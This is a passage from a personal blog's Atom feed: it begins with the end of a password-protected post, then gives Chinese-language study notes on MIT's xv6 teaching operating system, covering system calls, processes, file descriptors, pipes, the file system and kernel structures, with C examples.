31b2878376a821975bbf9eb9a59517a1fa1fb7f7e11f8f29069a97c945d8aac0138e86793a82a2a90ddaa54f5e76661da7d9740f9054110b2dfbd324a04a2720df53612e460f0e04374b2bca83ecf43e58bfdc0558d645f9e328a815b9c713f19a88c517f76b7303d45e45191fff9c23eb71a56ecb803cc116edc9ed9f95187cb378512695b8e816764d29821ddfd4e5f57c70eb550cfe02b77ab15d6b0ab1b5e8c2f14dd09095edd71cdf0fc9a3b82d50bed362f081356ecf5f2a7e9a4e1b68927c87a9f41deb7a1c5e59d08ce6b9eaf1d12f56b9d3574e1b46990705b1634175d2baa585b9a7ec5541cd940204694ba0f2fb4b77c0cd4de66848f73466dde735e361f5987465855a4cded23ec92de3cf0e99b02d9ba4d1d6fa93ee8ab99a0d0868cd4c4ffd1df59f2a19a0e4b3b6d55f1185c9e2de448f45cc562dc84e7a592931f786341eaaff042ae6b1c76b9ee5ad1ea285f84f6c93b6cc21949f179956e1e7e282f0e8ba08c5c2c8cd176a3de52800edd23cbb831cd4ec1204c4157ebf6866d104f46625152caf753cb59a13a7a402f48ebd1764f36bec5e06f74127f37938ef414ed69202ab03a6073618ee7e64143d6418e6843e4da0cc2895dc3dc30844ad62484160c8418f3996ec02ec582c23daa7d3ee3b2ac83f7ee1361cc36f1370136af48a520ff62a1a92161195ac504e6bb0f0746c33f73787a99e8b337e3bb8abc5662c1a63ec449947fa329cda4e508030b98f6a2251b74455ef8ed6db27ea0501035d8195503d59c70b4679fa17d85a37085f658f7c2bee258413cdcb7a8ed0ca19650e051553a95593773ecc0c1187cb16f777ef3189e220e4fb6c2c9e632750d614f9fa7966bffb02d8a1a9b5eacf78f5118e6e12a9b87f7e2e10832e5c3374f5a430c0e20084c8e49153ce52a17c9adea50364f05146f7cda01c92fd1e7f15a77a6502d5877a2964e6d54b5aa70730ab9c706e42f452b72dbcec358d6f203a502a278436c8ff75da2d286bfbc5e22d5a0dc28dc36ab48af9249b61a443baa60b3c7c8899daf7212595fd1da4125153ba6b08fa2fa17db878012633a52acf7607839fc37659aaba71621dc6f02272f57b78d733e434950016ceafb895bd089aceb1a395975ff1e649ce851c225225159fcd6a448329888ba9532f3a1f352a7cc8aea5403027853ecf490c1ccac1111b94ef8e6b48fc18605cf260cd9c82dc97c9580400b713544d42ce920cc50ad332724932f52205c6d44c2ed33e3ea0b8fa7aa61e5ca72d5e2aa40db6f8af15d101e227a0e42a79f93c51578c9c46a60655ae762a2ae111af0b31f62e38404472f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">坟墓里寂静无比，埋葬你的是所有你没说出口的话</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">坟墓里寂静无比，埋葬你的是所有你没说出口的话</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
    <category term="Life" scheme="https://ghostasky.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>XV6阅读笔记</title>
    <link href="https://ghostasky.github.io/2022/07/12/XV6/"/>
    <id>https://ghostasky.github.io/2022/07/12/XV6/</id>
    <published>2022-07-11T16:00:00.000Z</published>
    <updated>2022-07-21T06:09:43.872Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><blockquote><p>  英文版：<a href="https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf">https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf</a></p><p>  中文版：<a href="http://xv6.dgs.zone/">http://xv6.dgs.zone/</a></p></blockquote><h1 id="Chapter-1-Operating-system-interfaces"><a href="#Chapter-1-Operating-system-interfaces" class="headerlink" title="Chapter 1:Operating system interfaces"></a>Chapter 1:Operating system interfaces</h1><blockquote><p>  xv6 是 MIT 开发的一个教学用的完整的类 Unix 操作系统，并且在 MIT 的操作系统课程 <a href="http://pdos.csail.mit.edu/6.828/2012/xv6.html">6.828</a> 中使用</p><p>  xv6 是 Dennis Ritchie 和 Ken Thompson 合著的 Unix Version 6（v6）操作系统的重新实现。xv6 在一定程度上遵守 v6 的结构和风格，但它是用 ANSI C 实现的，并且是基于 x86 多核处理器的。</p></blockquote><p>进程通过<strong>系统调用</strong>使用内核服务。系统调用会进入内核，让内核执行服务然后返回。所以进程总是在用户空间和内核空间之间交替运行。</p><p>内核使用了CPU 的硬件保护机制来保证用户进程只能访问自己的内存空间。内核拥有实现保护机制所需的硬件权限(hardware privileges)，而用户程序没有这些权限。当一个用户程序进行一次系统调用时，硬件会提升特权级并且开始执行一些内核中预定义的功能。</p><p>xv6中提供的系统调用(部分unix)：</p><table><thead><tr><th>系统调用</th><th>描述</th></tr></thead><tbody><tr><td>fork()</td><td>创建进程</td></tr><tr><td>exit()</td><td>结束当前进程</td></tr><tr><td>wait()</td><td>等待子进程结束</td></tr><tr><td>kill(pid)</td><td>结束 pid 所指进程</td></tr><tr><td>getpid()</td><td>获得当前进程 pid</td></tr><tr><td>sleep(n)</td><td>睡眠 n 秒</td></tr><tr><td>exec(filename, *argv)</td><td>加载并执行一个文件</td></tr><tr><td>sbrk(n)</td><td>为进程内存空间增加 n 字节</td></tr><tr><td>open(filename, flags)</td><td>打开文件，flags 指定读&#x2F;写模式</td></tr><tr><td>read(fd, buf, n)</td><td>从文件中读 n 个字节到 buf</td></tr><tr><td>write(fd, buf, n)</td><td>从 buf 中写 n 个字节到文件</td></tr><tr><td>close(fd)</td><td>关闭打开的 fd</td></tr><tr><td>dup(fd)</td><td>复制 fd</td></tr><tr><td>pipe( p)</td><td>创建管道， 并把读和写的 fd 返回到p</td></tr><tr><td>chdir(dirname)</td><td>改变当前目录</td></tr><tr><td>mkdir(dirname)</td><td>创建新的目录</td></tr><tr><td>mknod(name, major, minor)</td><td>创建设备文件</td></tr><tr><td>fstat(fd)</td><td>返回文件信息</td></tr><tr><td>link(f1, f2)</td><td>给 f1 创建一个新名字(f2)</td></tr><tr><td>unlink(filename)</td><td>删除文件</td></tr></tbody></table><p>xv6 shell的具体实现在<code>user/sh.c</code></p><h2 id="1-1-进程和内存"><a href="#1-1-进程和内存" class="headerlink" title="1.1 进程和内存"></a>1.1 进程和内存</h2><p><code>fork</code> 函数在父进程、子进程中都返回（一次调用两次返回），对于父进程它返回子进程的 pid，对于子进程它返回 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;parent: child=%d\n&quot;</span>, pid);</span><br><span class="line">    pid = wait();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;child %d is done\n&quot;</span>, pid);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;child: exiting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>系统调用 <code>wait</code> 会返回一个<strong>当前进程已退出的子进程</strong>，如果没有子进程退出，<code>wait</code> 会等候直到有一个子进程退出。</p><p>父子进程拥有不同的内存空间和寄存器，改变一个进程中的变量不会影响另一个进程，这一点在代码中有体现。</p><p><code>exec</code>系统调用，从某个<em>文件</em>（通常是可执行文件）里读取内存镜像，并将其替换到调用它的进程的内存空间，这样的话，在执行<code>exec</code>系统调用后不返回，而是直接执行调用的elf文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *argv[<span class="number">3</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;echo&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">exec(<span class="string">&quot;/bin/echo&quot;</span>, argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;exec error\n&quot;</span>);<span class="comment">//注意这里，不返回，走这一步说明出问题了</span></span><br></pre></td></tr></table></figure><p>下面是xv6 shell的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="comment">// Ensure that three file descriptors are open.</span></span><br><span class="line"><span class="keyword">while</span> ((fd = open(<span class="string">&quot;console&quot;</span>, O_RDWR)) &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fd &gt;= <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Read and run input commands.</span></span><br><span class="line"><span class="keyword">while</span> (getcmd(buf, <span class="keyword">sizeof</span>(buf)) &gt;= <span class="number">0</span>)<span class="comment">//getcmd 读取命令行的输入</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; buf[<span class="number">2</span>] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Chdir must be called by the parent, not the child.</span></span><br><span class="line">buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>; <span class="comment">// chop \n</span></span><br><span class="line"><span class="keyword">if</span> (chdir(buf + <span class="number">3</span>) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;cannot cd %s\n&quot;</span>, buf + <span class="number">3</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fork1() == <span class="number">0</span>)<span class="comment">//调用fork</span></span><br><span class="line">runcmd(parsecmd(buf));</span><br><span class="line">wait(<span class="number">0</span>);<span class="comment">//父进程等待子进程退出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fork</code>的时候要拷贝elf的内容，空间不够的话：<code>sbrk(n)</code> 来增加 n 字节的数据内存。<code>sbrk</code> 返回新的内存的地址。</p><h2 id="1-2-I-x2F-O-和文件描述符"><a href="#1-2-I-x2F-O-和文件描述符" class="headerlink" title="1.2 I&#x2F;O 和文件描述符"></a>1.2 I&#x2F;O 和文件描述符</h2><p><strong>文件描述符</strong>是一个整数，它代表了一个进程可以读写的被内核管理的对象。进程可以通过多种方式获得一个文件描述符，如打开文件、目录、设备，或者创建一个管道（pipe），或者复制已经存在的文件描述符。</p><p>每个进程都有一张表，而 xv6 内核就以文件描述符作为这张表的索引，所以每个进程都有一个从0开始的文件描述符空间。见下图，但是这里不深究，也就看个大概，真想深究的话，去跟iofile的源码。</p><p>文件描述符0读入（标准输入），从文件描述符1输出（标准输出），从文件描述符2输出错误（标准错误输出）。</p><p><img src="/2022/07/12/XV6/image-20220707211016555.png"></p><p>系统调用 <code>close</code> 会释放一个文件描述符，使得它之后可以被 <code>open</code>, <code>pipe</code>, <code>dup</code> 等调用重用。新分配的文件描述符始终是当前进程中编号最少的未使用描述符。</p><p><code>fork</code> 会复制父进程的文件描述符和内存，所以子进程和父进程的文件描述符一模一样。</p><p><code>exec</code> 会替换调用它的进程的内存但是会保留它的文件描述符表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* argv[<span class="number">2</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    open(<span class="string">&quot;input.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    exec(<span class="string">&quot;cat&quot;</span>, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在子进程关闭文件描述符0之后，<code>open</code>使用新打开的input.txt(0文件描述符为0)。<code>cat</code>然后执行文件描述符0(标准输入)，但引用的是input.txt。父进程的文件描述符不会被这个序列改变，因为它只修改子进程的描述符。(这里还是挺有意思的)</p><p><code>open</code>的第二个参数由一组标志组成，这些标志以位表示，用于控制打开的操作。在<code>kernel/fcntl.h</code>中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDONLY  0x000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_WRONLY  0x001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDWR    0x002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_CREATE  0x200<span class="comment">//如果文件不存在则创建文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_TRUNC   0x400<span class="comment">//将文件截断为零长度</span></span></span><br></pre></td></tr></table></figure><p><code>dup</code>系统调用复制一个现有的文件描述符，返回一个引用自同一个底层I&#x2F;O对象的新文件描述符。</p><p>helloword的另一种写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = dup(<span class="number">1</span>);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">write(fd, <span class="string">&quot;world\n&quot;</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure><h2 id="1-3-管道"><a href="#1-3-管道" class="headerlink" title="1.3 管道"></a>1.3 管道</h2><p>管道是一个小的内核缓冲区，它以文件描述符对的形式提供给进程，一个用于写操作，一个用于读操作。从管道的一端写的数据可以从管道的另一端读取。提供了一种<strong>进程间</strong>交互的方式。就是队列，0是读，1是写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">pipe(p);</span><br><span class="line"><span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    dup(p[<span class="number">0</span>]);<span class="comment">//调用close和dup使文件描述符0指向管道的读取端</span></span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">    exec(<span class="string">&quot;/bin/wc&quot;</span>, argv);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    write(p[<span class="number">1</span>], <span class="string">&quot;hello world\n&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>link</code>系统调用创建另一个文件名，该文件名指向与现有文件相同的inode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&quot;a&quot;</span>, O_CREATE | O_WRONLY);</span><br><span class="line">link(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="comment">// 创建了一个既叫做 a 又叫做 b 的新文件</span></span><br><span class="line">unlink(<span class="string">&quot;a&quot;</span>)，</span><br></pre></td></tr></table></figure><p>读写 <code>a</code> 就相当于读写 <code>b</code>。每一个 inode 都由一个唯一的 <code>inode 号</code> 直接确定。在上面这段代码中，我们可以通过 <code>fstat</code> 知道 <code>a</code> 和 <code>b</code> 都指向同样的内容：<code>a</code> 和 <code>b</code> 都会返回同样的 inode 号（<code>ino</code>），并且 <code>nlink</code> 数会设置为2。</p><p>系统调用 <code>unlink</code> 从文件系统移除一个文件名。一个文件的 inode 和磁盘空间只有当它的链接数变为 0 的时候才会被清空，也就是没有一个文件再指向它。</p><h2 id="1-4-文件系统"><a href="#1-4-文件系统" class="headerlink" title="1.4 文件系统"></a>1.4 文件系统</h2><p>xv6 文件系统提供文件和目录，文件就是一个简单的字节数组，而目录包含指向文件和其他目录的引用。</p><p>不从 <code>/</code> 开始的目录表示的是相对调用进程当前目录的目录，调用进程的当前目录可以通过 <code>chdir</code> 这个系统调用进行改变。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">&quot;/a&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">open(<span class="string">&quot;c&quot;</span>, O_RDONLY);</span><br><span class="line">open(<span class="string">&quot;/a/b/c&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure><p><code>mknod</code>创建一个引用设备的特殊文件。与设备文件相关联的是主设备号和次设备号(<code>mknod</code>的两个参数)，它们唯一地标识了一个内核设备。当进程稍后打开设备文件时，内核将使用内核设备实现<code>read</code>和<code>write</code>系统调用，而不是使用文件系统。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&quot;/dir&quot;</span>);</span><br><span class="line">fd = open(<span class="string">&quot;/dir/file&quot;</span>, O_CREATE | O_WRONLY);</span><br><span class="line">close(fd);</span><br><span class="line">mknod(<span class="string">&quot;/console&quot;</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>同一个底层文件（叫做inode，索引结点）可以有多个名字（叫做link，链接）。每个链接都由目录中的一个条目组成;该条目包含一个文件名和一个inode引用。Inode保存有关文件的元数据（用于解释或帮助理解信息的数据），包括其类型(文件&#x2F;目录&#x2F;设备)、长度、文件内容在磁盘上的位置以及指向文件的链接数。</p><p><code>fstat</code> 可以获取一个文件描述符指向的文件的信息。它填充一个名为 <code>stat</code> 的结构体，它在 <code>stat.h</code> 中定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_DIR     1   <span class="comment">// Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_FILE    2   <span class="comment">// File</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_DEVICE  3   <span class="comment">// Device</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> dev;     <span class="comment">// File system&#x27;s disk device</span></span><br><span class="line">  uint ino;    <span class="comment">// Inode number,Inode编号</span></span><br><span class="line">  <span class="keyword">short</span> type;  <span class="comment">// Type of file</span></span><br><span class="line">  <span class="keyword">short</span> nlink; <span class="comment">// Number of links to file，指向文件的链接数</span></span><br><span class="line">  uint64 size; <span class="comment">// Size of file in bytes</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Chapter-2-Operating-system-organization"><a href="#Chapter-2-Operating-system-organization" class="headerlink" title="Chapter 2:Operating system organization"></a>Chapter 2:Operating system organization</h1><h2 id="2-1-xv6架构"><a href="#2-1-xv6架构" class="headerlink" title="2.1 xv6架构"></a>2.1 xv6架构</h2><table><thead><tr><th><strong>文件</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>bio.c</strong></td><td>文件系统的磁盘块缓存</td></tr><tr><td><strong>def.h</strong></td><td>模块间的接口定义</td></tr><tr><td><strong>console.c</strong></td><td>连接到用户的键盘和屏幕</td></tr><tr><td><strong>entry.S</strong></td><td>首次启动指令</td></tr><tr><td><strong>exec.</strong></td><td><code>exec()</code>系统调用</td></tr><tr><td><strong>file.c</strong></td><td>文件描述符支持</td></tr><tr><td><strong>fs.c</strong></td><td>文件系统</td></tr><tr><td><strong>kalloc.c</strong></td><td>物理页面分配器</td></tr><tr><td><strong>kernelvec.S</strong></td><td>处理来自内核的陷入指令以及计时器中断</td></tr><tr><td><strong>log.c</strong></td><td>文件系统日志记录以及崩溃修复</td></tr><tr><td><strong>main.c</strong></td><td>在启动过程中控制其他模块初始化</td></tr><tr><td><strong>pipe.c</strong></td><td>管道</td></tr><tr><td><strong>plic.c</strong></td><td>RISC-V中断控制器</td></tr><tr><td><strong>printf.c</strong></td><td>格式化输出到控制台</td></tr><tr><td><strong>proc.c</strong></td><td>进程和调度</td></tr><tr><td><strong>sleeplock.c</strong></td><td>Locks that yield the CPU</td></tr><tr><td><strong>spinlock.c</strong></td><td>Locks that don’t yield the CPU.</td></tr><tr><td><strong>start.c</strong></td><td>早期机器模式启动代码</td></tr><tr><td><strong>string.c</strong></td><td>字符串和字节数组库</td></tr><tr><td><strong>swtch.c</strong></td><td>线程切换</td></tr><tr><td><strong>syscall.c</strong></td><td>Dispatch system calls to handling function.</td></tr><tr><td><strong>sysfile.c</strong></td><td>文件相关的系统调用</td></tr><tr><td><strong>sysproc.c</strong></td><td>进程相关的系统调用</td></tr><tr><td><strong>trampoline.S</strong></td><td>用于在用户和内核之间切换的汇编代码</td></tr><tr><td><strong>trap.c</strong></td><td>对陷入指令和中断进行处理并返回的C代码</td></tr><tr><td><strong>uart.c</strong></td><td>串口控制台设备驱动程序</td></tr><tr><td><strong>virtio_disk.c</strong></td><td>磁盘设备驱动程序</td></tr><tr><td><strong>vm.c</strong></td><td>管理页表和地址空间</td></tr></tbody></table><h2 id="2-2进程概述"><a href="#2-2进程概述" class="headerlink" title="2.2进程概述"></a>2.2进程概述</h2><p>xv6 使用页表（由硬件实现）来为每个进程提供其独有的地址空间(实现隔离)。</p><p>页表将<em>虚拟地址</em>（x86 指令所使用的地址）翻译（或说“映射”）为<em>物理地址</em>（处理器芯片向主存发送的地址）。</p><p>Xv6为每个进程维护一个单独的页表，定义了该进程的地址空间。</p><p> RISC-V上的指针有64位宽；硬件在页表中查找虚拟地址时只使用低39位；xv6只使用这39位中的38位。因此，最大地址是2^38-1&#x3D;0x3fffffffff，即<code>MAXVA</code>，在<strong>kernel&#x2F;riscv.h</strong>中定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// one beyond the highest possible virtual address.</span></span><br><span class="line"><span class="comment">// MAXVA is actually one bit less than the max allowed by</span></span><br><span class="line"><span class="comment">// Sv39, to avoid having to sign-extend virtual addresses</span></span><br><span class="line"><span class="comment">// that have the high bit set.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVA (1L &lt;&lt; (9 + 9 + 9 + 12 - 1))</span></span><br></pre></td></tr></table></figure><p>xv6为<code>trampoline</code>（用于在用户和内核之间切换）和映射进程切换到内核的<code>trapframe</code>分别保留了一个页面:</p><p><img src="/2022/07/12/XV6/image-20220713121236349.png"></p><p>xv6内核为每个进程维护许多状态片段，并将它们聚集到一个<code>proc</code>结构体中<code>kernel/proc.h</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state,表明进程是已分配、就绪态、运行态、等待I/O中（阻塞态）还是退出</span></span><br><span class="line">  <span class="keyword">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="keyword">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="keyword">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="keyword">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait_lock must be held when using this:</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span 